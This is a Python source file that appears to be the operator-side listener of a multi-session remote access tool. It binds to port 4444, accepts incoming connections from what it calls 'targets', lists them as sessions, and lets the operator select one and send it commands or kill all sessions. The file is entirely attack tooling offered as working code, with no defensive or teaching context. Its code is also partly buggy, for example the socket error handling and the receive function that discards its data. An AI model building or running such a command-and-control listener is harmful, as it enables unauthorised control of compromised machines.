import os, socket, time, threading, sys
from queue import Queue

queue = Queue()
threads = 2
jobs = [1,2]

addresses = []
connections = []

selected_connection = None
host = "192.168.15.105"
port = 4444
buffer_bytes = 1024

def decode_utf8(bytes):
    return bytes.decode("utf-8")
def remove_quotes(string):
    return string.replace("\"", "")
def send_command(data):
    selected_connection.send(data)
def receive_data(buffer):
    selected_connection.recv(buffer)

def create_socket():
    global s
    try:
        s = socket.socket()
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    except socket.error() as e:
        print("Error creating the socket: ", str(e))
def socket_bind():
    global s
    try:
        print("Listening on port: ", str(port))
        s.bind((host, port))
        s.listen(20)
    except socket.error() as e:
        print("Error binding the socket: ", str(e))     
        socket_bind()   

def socket_accept():
    while True:
        try:
            conn, address = s.accept()
            conn.setblocking(1) # sem timeout
            connections.append(conn)
            client_info = decode_utf8(conn.recv(buffer_bytes)).split("',")
            client_info.append(address[0])
            client_info.append(address[1])
            addresses.append(client_info)
            print("\nConnection has been estabilished:", address[0])
        except socket.error:
            print("Error accepting connections")

def create_threads():
    for i in range(threads):
        thread = threading.Thread(target=work)
        thread.daemon = True
        thread.start()
    
    queue.join()

def menu_help():
    print("\n-h See all availabe commands")
    print("-l List all your open sessions")
    print("-x Kill all sessions")
    print("-i id Interact with a session" )
    print("")

def select_connection(connection_id):
    global conn, selected_connection

    try:
        connection_id = int(connection_id)
        conn = connections[connection_id]
        print("Connecting to: ", addresses[connection_id][2], " - ", addresses[connection_id][0], addresses[connection_id][1])
        selected_connection = conn
    except:
        print("Invalid session!")
        return

def interact():
    while True:
        choice = input("\nChoose an option: ")
        if (choice[:3] == "--m" and len(choice) > 3):
            message = choice[4:]
            send_command(message.encode())     

def close():
    global connections, addresses

    if (len(addresses) == 0):
        return
    
    for counter, conn in enumerate(connections):
        conn.send(str.encode("exit"))
        conn.close()

    del connections
    del addresses
    connections = [] 
    addresses = []

def list_connections():
    if (len(addresses)) > 0:
        print("\nConnected targets: ")
        print("====================")
        print("")
        print("ID -  SESSION")
        for i, address in enumerate(addresses):
            print(i, " - ", address[2], " ", address[0], address[1])   
    else:
        print("No connections.")

def main_menu():
    menu_help()

    while True:
        choice = input("\n>> ")
        if (choice == "-l"):
            list_connections()
        elif (choice == "-h"):
            menu_help()
        elif (choice == "-x"):
            close()
            break
        elif (choice[:2] == "-i" and len(choice) > 2):
            select_connection(choice[3:])
            if (selected_connection is not None):
                interact()
        else:
            print("Invalid choice!")
            menu_help()

def work():
    while True:
        value = queue.get()
        if value == 1:
            create_socket()
            socket_bind()
            socket_accept()
        elif value == 2:
            while True:
                time.sleep(0.2)
                if (len(addresses) > 0):
                    main_menu()
                    break
        queue.task_done()
        queue.task_done()
        sys.exit(0)


def create_jobs():
    for thread in jobs:
        queue.put(thread)
    queue.join()


create_threads()
create_jobs()
